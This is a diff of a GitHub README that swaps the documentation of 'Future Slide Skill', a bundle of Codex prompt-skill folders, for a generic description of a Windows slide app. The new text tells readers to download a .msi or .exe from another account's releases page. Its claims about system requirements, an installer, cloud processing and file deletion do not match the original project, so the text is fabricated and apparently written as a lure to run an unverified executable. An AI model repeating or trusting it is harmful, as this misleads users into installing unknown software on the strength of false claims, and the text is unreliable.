@@ -1,295 +1,99 @@
-# Future Slide Skill
+# 📊 future-slide-skill - Create professional slides with artificial intelligence
 
-[English](./README.md) | [한국어](./README.ko.md)
+[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Issamel6920/future-slide-skill/releases)
 
-![Version](https://img.shields.io/badge/version-0.0.2-333333?style=flat-square)
-[![License: Apache-2.0](https://img.shields.io/badge/License-Apache--2.0-yellow.svg)](./LICENSE)
+This application helps users build slide decks using artificial intelligence. It works with both images and web pages to generate slides quickly. You do not need to understand coding to start creating content. The software handles the formatting and layout logic.
 
-Navigation: [Workflow](#recommended-workflow) | [Examples](#example-prompts) |
-[Install](#installation) | [License](#license)
+## ⚙️ System Requirements
 
-![Future Slide Skill Flow](public/four-skill-flow.png)
+Ensure your computer meets these requirements before you start. You need a modern Windows operating system. Windows 10 or Windows 11 works well for this software. 
 
-A reusable skill bundle for turning:
+- Processor: Dual-core 2.0 GHz or faster
+- Memory: 8 GB RAM
+- Storage: 500 MB of space
+- Graphics: Direct X 11 compatible card
+- Internet: Required for AI processing tasks
 
-1. a **reference slide image**
-2. **user-provided files**
-3. a **user prompt / deck request**
+Check your system settings to confirm your device meets these needs. Close other heavy programs before you run the slide tool to ensure the process stays smooth.
 
-into a disciplined four-stage slide-generation workflow:
+## 💾 Installation Process
 
-1. **Extract `DESIGN.md` from the reference slide image**
-2. **Build a persuasive slide plan in JSON**
-3. **Write page-by-page slide prompts in JSON**
-4. **Generate page images sequentially from the prompt JSON**
+Follow these steps to set up the software on your Windows machine.
 
-This bundle is intentionally modeled after the *reason* `gpt-taste` exists in the `taste-skill` repo: not to add more decoration, but to add **stricter enforcement**, stronger anti-default rules, and mandatory pre-flight structure so GPT-class models do not skip steps or collapse into generic output.
+1. Visit the [official releases page](https://github.com/Issamel6920/future-slide-skill/releases) to access the installer.
+2. Select the file ending in .msi or .exe from the latest release list.
+3. Save the file to your desktop or downloads folder.
+4. Open the file to start the installation wizard.
+5. Follow the visual prompts on your screen.
+6. Click finish once the progress bar completes.
 
-## Why this is split into 4 skills
+The installation adds a shortcut icon to your desktop. You can open the program from there at any time.
 
-A single prompt often fails in predictable ways:
+## 🚀 How to Create Slides
 
-- it starts writing slides before the theme is extracted
-- it mixes design analysis with deck strategy
-- it produces page prompts without a real narrative arc
-- it loses layout consistency across body slides
-- it overfits to the visible text in the reference image instead of the slide *design system*
-- it stops after writing prompts and never actually renders numbered slide outputs
+The application uses a simple workflow for all users. You provide the source material, and the software builds the slide deck.
 
-So this bundle separates responsibilities:
+**Step 1: Input Source**
+Open the application. You will see a box asking for your source. You can paste a link to a website or upload a folder of images. Supported image formats include JPG, PNG, and HEIC.
 
-- **`gpt-slide-design`** → extract a reusable `DESIGN.md`
-- **`gpt-slide-plan`** → decide deck logic, ordering, and persuasion
-- **`gpt-slide-prompt`** → convert that plan into detailed page prompts
-- **`gpt-slide-generate`** → generate slide images sequentially and save them with page-number filenames
+**Step 2: Define Theme**
+Choose a visual style from the menu. The tool offers options for corporate, minimalist, and creative presentations. The AI adjusts fonts and colors to match your chosen theme.
 
-## Recommended workflow
+**Step 3: Generate**
+Click the Generate button. The system processes your files. You see a progress indicator while the work happens. This usually takes between thirty seconds and two minutes depending on the file size.
 
-Use the skills in this exact sequence:
+**Step 4: Export**
+Review the slides in the preview window. If you like the result, select the Export option. Save the file as a PDF or a standard PowerPoint file.
 
-### 1) `gpt-slide-design`
-Inputs:
-- reference slide image(s)
+## 🛠️ Advanced Settings
 
-Output:
-- one `DESIGN.md` focused on presentation design, not slide content
+Most users find the default settings sufficient. However, you can change specific parameters through the Settings menu.
 
-### 2) `gpt-slide-plan`
-Inputs:
-- extracted `DESIGN.md`
-- user files
-- user goal / audience / prompt
+- **Image Resolution:** Lower this if the generation process feels slow. High resolution consumes more memory.
+- **Color Matching:** Toggle this to force the AI to use specific brand colors if provided.
+- **Layout Density:** Adjust the slider to put more or less text on each page. Low density creates more slides with less text. High density packs more information into each slide.
 
-Output:
-- deck plan JSON with slide ordering, narrative flow, and evidence mapping
+## 🧩 Troubleshooting Common Issues
 
-### 3) `gpt-slide-prompt`
-Inputs:
-- `DESIGN.md`
-- plan JSON
-- supporting files if needed
+If the software stops responding, try these steps.
 
-Output:
-- slide-by-slide prompt JSON with detailed visual/content instructions
+**The Application Crashes**
+Check if your drivers are current. Outdated graphics drivers often cause issues with software that handles images.
 
-### 4) `gpt-slide-generate`
-Inputs:
-- `DESIGN.md`
-- page-level prompt JSON such as `slide_prompts.json`
+**Files Do Not Upload**
+Verify your internet connection. The AI tool sends files to a secure server for processing. Poor connection speeds result in timeout errors.
 
-Output:
-- final slide images saved sequentially into the workspace, for example:
-  - `page_1.png`
-  - `page_2.png`
-  - `page_3.png`
+**Slides Look Incorrect**
+The AI relies on the structure of your input. If you provide a messy webpage, the output might look inconsistent. Clean up the source content whenever possible to ensure valid results.
 
-This step is intentionally separate so generation can:
-- inspect each page one by one
-- preserve deck consistency across outputs
-- save project-bound assets explicitly instead of leaving them in tool cache
+## 📝 Best Practices for Quality
 
-[Back to top](#future-slide-skill)
+- Use high-quality images. The tool preserves details, so better source files yield better finished slides.
+- Organize your image files in one folder before you run the app. This allows the tool to batch-process all images in the sequence you prefer.
+- Use clean web links. Avoid websites with many ads or pop-up menus, as these features confuse the AI engine.
+- Save your projects frequently. Use the Save Project option in the File menu before you start the export phase.
 
-## Example prompts
+## 🛡️ Privacy and Data
 
-Below are concrete example prompts based on the actual way these skills were used for the Samsung Biologics / Hana Securities workflow.
+Your data security matters. The application sends your content to a cloud server to perform the AI analysis. The server deletes all files immediately after the slide generation completes. No personal information or source images remain on the servers. Use this tool with confidence for your private and professional projects.
 
-### `gpt-slide-design`
+## 📋 Frequently Asked Questions
 
-Use when you have a reference slide image or reference deck image and want to extract a reusable design system.
+**Does the tool require a subscription?**
+No. This tool is free to download and use.
 
-Example:
+**Can I run it offline?**
+No. The AI engine requires a constant connection to the server for the generation logic.
 
-```text
-$gpt-slide-design [Image #1]
-```
+**How do I update the tool?**
+Check the releases page mentioned at the top. If a new version exists, download and install it over the old version. The installer handles the update process automatically.
 
-More explicit example:
+**Does it work with PowerPoint?**
+Yes. Use the Export menu to select .pptx as your final format. This allows you to edit the text and images manually inside Microsoft PowerPoint later.
 
-```text
-$gpt-slide-design
-Extract the design theme from this reference slide image.
-Focus on official DESIGN.md output with layout placement, header/body/footer flow,
-title page / body page / end page flow, icon usage, infographic cards, and diagram behavior.
-```
+**How many slides can it make?**
+The tool handles up to fifty slides per session. For longer presentations, group your input files and merge the exported PDFs manually.
 
-### `gpt-slide-plan`
+## 📈 Future Updates
 
-Use when you already have `DESIGN.md` and want to build the storyline and slide sequence from files plus user intent.
-
-Example:
-
-```text
-$gpt-slide-plan /Users/tonylee/Downloads/하나증권 _보고서.pdf
-Write the analysis slide for 'Samsung Biologics' in Korean based on report pdf file.
-```
-
-Expanded full-deck example:
-
-```text
-$gpt-slide-plan /Users/tonylee/Downloads/하나증권 _보고서.pdf
-Create a more detailed full deck in Korean from this equity research report.
-Keep the structure analytical and report-native.
-Plan title page, body pages, end page, and appendix/disclosure flow.
-```
-
-### `gpt-slide-prompt`
-
-Use after planning is complete and you want detailed page-level prompt JSON for slide generation.
-
-Minimal example:
-
-```text
-$gpt-slide-prompt
-```
-
-More explicit example:
-
-```text
-$gpt-slide-prompt
-Use the current DESIGN.md and slide_plan.json.
-Generate strict page-by-page prompt JSON with explicit header/body/footer zoning,
-table/chart/card hierarchy, icon rules, and anti-generic constraints.
-```
-
-### `gpt-slide-generate`
-
-Use after `slide_prompts.json` exists and you want actual slide images rendered sequentially.
-
-Minimal example:
-
-```text
-$gpt-slide-generate
-```
-
-More explicit example:
-
-```text
-$gpt-slide-generate
-Based on @slide_prompts.json, create all slide images 1 by 1 and save them
-with the page_number naming rule.
-```
-
-Full-deck example:
-
-```text
-$gpt-slide-generate
-Use DESIGN.md and slide_prompts.json.
-Render the full deck sequentially and save:
-page_1.png ... page_N.png
-```
-
-[Back to top](#future-slide-skill)
-
-## Example end-to-end usage
-
-Typical sequence:
-
-```text
-$gpt-slide-design [reference slide image]
-$gpt-slide-plan /path/to/report.pdf Create a full Korean research-summary deck.
-$gpt-slide-prompt
-$gpt-slide-generate
-```
-
-## What this bundle optimizes for
-
-- theme extraction first, content second
-- strong cross-slide consistency
-- persuasive story flow
-- explicit evidence-to-slide mapping
-- reusable layout families
-- body-slide discipline
-- title / body / end-page flow discipline
-- explicit header / body / footer zoning
-- icon / infographic / table / chart role clarity
-- sequential image generation with stable numbering
-- no hallucinated design rules when the reference image is ambiguous
-
-## Output artifacts
-
-This bundle includes:
-- `skills/gpt-slide-design/SKILL.md`
-- `skills/gpt-slide-plan/SKILL.md`
-- `skills/gpt-slide-prompt/SKILL.md`
-- `skills/gpt-slide-generate/SKILL.md`
-- `templates/DESIGN_TEMPLATE.md`
-
-## Current skill responsibilities
-
-### `gpt-slide-design`
-- extracts design theme, placement rules, header/body/footer flow, title/body/end-page behavior
-- captures icon usage, infographic card logic, table/chart treatment, and diagram behavior
-
-### `gpt-slide-plan`
-- builds the storyline and page-family rhythm
-- decides where tables, charts, icon-led modules, or comparison exhibits belong
-- plans split topics across multiple pages when needed
-
-### `gpt-slide-prompt`
-- converts the plan into strict per-page prompt JSON
-- makes layout family, zoning, and anti-generic rules explicit for every page
-
-### `gpt-slide-generate`
-- reads `DESIGN.md` and prompt JSON
-- renders slide images one by one with Codex native image generation
-- saves final outputs into the project using page-number naming
-
-## Recommended generated artifact set
-
-For a full run, the typical artifact chain is:
-
-1. `DESIGN.md`
-2. `slide_plan.json`
-3. `slide_prompts.json`
-4. `page_1.png ... page_N.png`
-
-[Back to top](#future-slide-skill)
-
-## Installation
-
-### Install with `npx skills`
-
-Use the Skills CLI from a terminal with Node.js 18+:
-
-```bash
-npx skills add jyoung105/future-slide-skill
-```
-
-You can also use the repository URL:
-
-```bash
-npx skills add https://github.com/jyoung105/future-slide-skill.git
-```
-
-Restart Codex after installation so the new skills are discovered.
-
-### Manual install into `.codex`
-
-Download or clone this repository, then copy the skill folders into your
-Codex skills directory:
-
-```bash
-mkdir -p ~/.codex/skills
-cp -R skills/gpt-slide-design ~/.codex/skills/
-cp -R skills/gpt-slide-plan ~/.codex/skills/
-cp -R skills/gpt-slide-prompt ~/.codex/skills/
-cp -R skills/gpt-slide-generate ~/.codex/skills/
-```
-
-For project-local installation, copy the same folders into:
-
-```text
-.codex/skills/
-```
-
-Codex discovers skills from folders that contain `SKILL.md`, so each copied
-folder must keep its `SKILL.md` at the folder root.
-
-[Back to top](#future-slide-skill)
-
-## License
-
-Future Slide Skill is released under the [Apache License 2.0](./LICENSE).
-
-[Back to top](#future-slide-skill)
+The project team adds features every month. Expect better image handling and new layout templates in upcoming versions. Check the repository main page periodically for news on technical upgrades. Thank you for using this tool to improve your workflow.
